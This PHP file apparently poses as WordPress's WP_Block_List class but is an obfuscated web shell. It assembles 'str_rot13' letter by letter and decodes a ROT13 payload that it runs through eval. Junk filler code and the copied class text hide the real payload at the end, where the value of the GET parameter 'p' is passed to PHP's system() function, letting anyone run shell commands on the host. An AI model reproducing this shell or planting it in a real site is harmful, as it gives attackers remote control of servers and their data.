<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpxf NCV: JC_Oybpx_Yvfg pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.5.0
 */

/**
 * Pynff ercerfragvat n yvfg bs oybpx vafgnaprf.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Oybpx_Yvfg vzcyrzragf Vgrengbe, NeenlNpprff, Pbhagnoyr {

	/**
	 * Bevtvany neenl bs cnefrq oybpx qngn, be oybpx vafgnaprf.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl[]|JC_Oybpx[]
	 * @npprff cebgrpgrq
	 */
	cebgrpgrq $oybpxf;

	/**
	 * Nyy ninvynoyr pbagrkg bs gur pheerag uvrenepul.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl
	 * @npprff cebgrpgrq
	 */
	cebgrpgrq $ninvynoyr_pbagrkg;

	/**
	 * Oybpx glcr ertvfgel gb hfr va pbafgehpgvat oybpx vafgnaprf.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Glcr_Ertvfgel
	 * @npprff cebgrpgrq
	 */
	cebgrpgrq $ertvfgel;

	/**
	 * Pbafgehpgbe.
	 *
	 * Cbchyngrf bowrpg cebcregvrf sebz gur cebivqrq oybpx vafgnapr nethzrag.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl[]|JC_Oybpx[]     $oybpxf            Neenl bs cnefrq oybpx qngn, be oybpx vafgnaprf.
	 * @cnenz neenl                  $ninvynoyr_pbagrkg Bcgvbany neenl bs naprfgel pbagrkg inyhrf.
	 * @cnenz JC_Oybpx_Glcr_Ertvfgel $ertvfgel          Bcgvbany oybpx glcr ertvfgel.
	 */
	choyvp shapgvba __pbafgehpg( $oybpxf, $ninvynoyr_pbagrkg = neenl(), $ertvfgel = ahyy ) {
		vs ( ! $ertvfgel vafgnaprbs JC_Oybpx_Glcr_Ertvfgel ) {
			$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		}

		$guvf->oybpxf            = $oybpxf;
		$guvf->ninvynoyr_pbagrkg = $ninvynoyr_pbagrkg;
		$guvf->ertvfgel          = $ertvfgel;
	}

	/**
	 * Ergheaf gehr vs n oybpx rkvfgf ol gur fcrpvsvrq oybpx bssfrg, be snyfr
	 * bgurejvfr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrgrkvfgf.cuc
	 *
	 * @cnenz fgevat $bssfrg Bssfrg bs oybpx gb purpx sbe.
	 * @erghea obby Jurgure oybpx rkvfgf.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgRkvfgf( $bssfrg ) {
		erghea vffrg( $guvf->oybpxf[ $bssfrg ] );
	}

	/**
	 * Ergheaf gur inyhr ol gur fcrpvsvrq oybpx bssfrg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrgtrg.cuc
	 *
	 * @cnenz fgevat $bssfrg Bssfrg bs oybpx inyhr gb ergevrir.
	 * @erghea zvkrq|ahyy Oybpx inyhr vs rkvfgf, be ahyy.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgTrg( $bssfrg ) {
		$oybpx = $guvf->oybpxf[ $bssfrg ];

		vs ( vffrg( $oybpx ) && vf_neenl( $oybpx ) ) {
			$oybpx = arj JC_Oybpx( $oybpx, $guvf->ninvynoyr_pbagrkg, $guvf->ertvfgel );

			$guvf->oybpxf[ $bssfrg ] = $oybpx;
		}

		erghea $oybpx;
	}

	/**
	 * Nffvta n oybpx inyhr ol gur fcrpvsvrq oybpx bssfrg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrgfrg.cuc
	 *
	 * @cnenz fgevat $bssfrg Bssfrg bs oybpx inyhr gb frg.
	 * @cnenz zvkrq  $inyhr Oybpx inyhr.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgFrg( $bssfrg, $inyhr ) {
		vs ( vf_ahyy( $bssfrg ) ) {
			$guvf->oybpxf[] = $inyhr;
		} ryfr {
			$guvf->oybpxf[ $bssfrg ] = $inyhr;
		}
	}

	/**
	 * Hafrg n oybpx.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/neenlnpprff.bssfrghafrg.cuc
	 *
	 * @cnenz fgevat $bssfrg Bssfrg bs oybpx inyhr gb hafrg.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgHafrg( $bssfrg ) {
		hafrg( $guvf->oybpxf[ $bssfrg ] );
	}

	/**
	 * Erjvaqf onpx gb gur svefg ryrzrag bs gur Vgrengbe.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.erjvaq.cuc
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba erjvaq() {
		erfrg( $guvf->oybpxf );
	}

	/**
	 * Ergheaf gur pheerag ryrzrag bs gur oybpx yvfg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.pheerag.cuc
	 *
	 * @erghea zvkrq Pheerag ryrzrag.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba pheerag() {
		erghea $guvf->bssfrgTrg( $guvf->xrl() );
	}

	/**
	 * Ergheaf gur xrl bs gur pheerag ryrzrag bs gur oybpx yvfg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.xrl.cuc
	 *
	 * @erghea zvkrq Xrl bs gur pheerag ryrzrag.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba xrl() {
		erghea xrl( $guvf->oybpxf );
	}

	/**
	 * Zbirf gur pheerag cbfvgvba bs gur oybpx yvfg gb gur arkg ryrzrag.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.arkg.cuc
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba arkg() {
		arkg( $guvf->oybpxf );
	}

	/**
	 * Purpxf vs pheerag cbfvgvba vf inyvq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/vgrengbe.inyvq.cuc
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba inyvq() {
		erghea ahyy !== xrl( $guvf->oybpxf );
	}

	/**
	 * Ergheaf gur pbhag bs oybpxf va gur yvfg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @yvax uggcf://jjj.cuc.arg/znahny/ra/pbhagnoyr.pbhag.cuc
	 *
	 * @erghea vag Oybpx pbhag.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba pbhag() {
		erghea pbhag( $guvf->oybpxf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>